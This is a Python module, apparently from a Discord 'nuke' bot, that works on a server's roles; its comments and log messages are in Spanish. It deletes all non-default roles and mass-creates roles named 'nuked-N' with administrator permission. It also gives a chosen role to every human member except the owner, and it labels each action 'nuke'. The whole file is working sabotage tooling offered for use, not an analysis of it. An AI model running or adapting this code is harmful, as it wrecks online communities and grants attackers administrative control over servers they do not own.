"""Operaciones sobre roles."""
from __future__ import annotations

import discord

from .utils import human, pool


def _colour(hexcode: str) -> discord.Colour:
    try:
        return discord.Colour.from_str(hexcode)
    except Exception:
        return discord.Colour(0xA855F7)


async def destroy_roles(guild: discord.Guild, *, keep_managed: bool = True,
                        concurrency: int = 4, log=print) -> int:
    targets = [
        r for r in guild.roles
        if not r.is_default() and (not keep_managed or not r.managed)
    ]
    log(f"Borrando {human(len(targets))} roles...")
    await pool(targets, lambda r, _i: r.delete(reason="nuke"), concurrency)
    return len(targets)


async def spam_roles(guild, count: int, *, name: str = "nuked", color: str = "#A855F7",
                     concurrency: int = 3, log=print) -> int:
    log(f"Creando {human(count)} roles...")
    counter = {"n": 0}

    async def create(index):
        try:
            await guild.create_role(
                name=f"{name}-{index}",
                colour=_colour(color),
                hoist=True,
                mentionable=True,
                permissions=discord.Permissions(administrator=True),
                reason="nuke",
            )
            counter["n"] += 1
        except Exception:
            pass

    await pool(range(1, count + 1), lambda item, _i: create(item), concurrency)
    return counter["n"]


async def give_role_to_all(guild, role_id: int, *, concurrency: int = 3, log=print) -> int:
    from .members import fetch_all_members

    members = await fetch_all_members(guild)
    targets = [m for m in members if not m.bot and not m.bot and m.id != guild.owner_id]
    log(f"Asignando rol a {human(len(targets))} miembros...")

    async def give(member):
        try:
            await member.add_roles(discord.Object(id=role_id), reason="nuke")
        except Exception:
            pass

    await pool(targets, lambda m, _i: give(m), concurrency)
    return len(targets)
